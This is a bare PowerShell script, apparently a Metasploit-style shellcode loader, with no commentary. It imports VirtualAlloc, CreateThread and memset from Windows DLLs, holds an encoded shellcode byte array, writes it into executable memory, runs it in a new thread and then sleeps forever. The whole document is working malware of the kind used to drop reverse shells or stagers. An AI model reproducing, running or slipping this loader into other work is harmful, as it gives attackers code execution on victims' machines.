$GKj = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $GKj -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdd,0xc2,0xd9,0x74,0x24,0xf4,0xbb,0xd3,0x71,0xcc,0x77,0x5e,0x2b,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x5e,0x14,0x03,0x5e,0xc7,0x93,0x39,0x8b,0x0f,0xd1,0xc2,0x74,0xcf,0xb6,0x4b,0x91,0xfe,0xf6,0x28,0xd1,0x50,0xc7,0x3b,0xb7,0x5c,0xac,0x6e,0x2c,0xd7,0xc0,0xa6,0x43,0x50,0x6e,0x91,0x6a,0x61,0xc3,0xe1,0xed,0xe1,0x1e,0x36,0xce,0xd8,0xd0,0x4b,0x0f,0x1d,0x0c,0xa1,0x5d,0xf6,0x5a,0x14,0x72,0x73,0x16,0xa5,0xf9,0xcf,0xb6,0xad,0x1e,0x87,0xb9,0x9c,0xb0,0x9c,0xe3,0x3e,0x32,0x71,0x98,0x76,0x2c,0x96,0xa5,0xc1,0xc7,0x6c,0x51,0xd0,0x01,0xbd,0x9a,0x7f,0x6c,0x72,0x69,0x81,0xa8,0xb4,0x92,0xf4,0xc0,0xc7,0x2f,0x0f,0x17,0xba,0xeb,0x9a,0x8c,0x1c,0x7f,0x3c,0x69,0x9d,0xac,0xdb,0xfa,0x91,0x19,0xaf,0xa5,0xb5,0x9c,0x7c,0xde,0xc1,0x15,0x83,0x31,0x40,0x6d,0xa0,0x95,0x09,0x35,0xc9,0x8c,0xf7,0x98,0xf6,0xcf,0x58,0x44,0x53,0x9b,0x74,0x91,0xee,0xc6,0x10,0x56,0xc3,0xf8,0xe0,0xf0,0x54,0x8a,0xd2,0x5f,0xcf,0x04,0x5e,0x17,0xc9,0xd3,0xa1,0x02,0xad,0x4c,0x5c,0xad,0xce,0x45,0x9a,0xf9,0x9e,0xfd,0x0b,0x82,0x74,0xfe,0xb4,0x57,0xe0,0xfb,0x22,0x98,0x5d,0x09,0xb1,0x70,0x9c,0x0e,0xa4,0xdc,0x29,0xe8,0x96,0x8c,0x79,0xa5,0x56,0x7d,0x3a,0x15,0x3e,0x97,0xb5,0x4a,0x5e,0x98,0x1f,0xe3,0xf4,0x77,0xf6,0x5b,0x60,0xe1,0x53,0x17,0x11,0xee,0x49,0x5d,0x11,0x64,0x7e,0xa1,0xdf,0x8d,0x0b,0xb1,0xb7,0x7d,0x46,0xeb,0x11,0x81,0x7c,0x86,0x9d,0x17,0x7b,0x01,0xca,0x8f,0x81,0x74,0x3c,0x10,0x79,0x53,0x37,0x99,0xef,0x1c,0x2f,0xe6,0xff,0x9c,0xaf,0xb0,0x95,0x9c,0xc7,0x64,0xce,0xce,0xf2,0x6a,0xdb,0x62,0xaf,0xfe,0xe4,0xd2,0x1c,0xa8,0x8c,0xd8,0x7b,0x9e,0x12,0x22,0xae,0x1e,0x6e,0xf5,0x96,0x54,0x9e,0xc5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$JIN=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($JIN.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$JIN,0,0,0);for (;;){Start-sleep 60};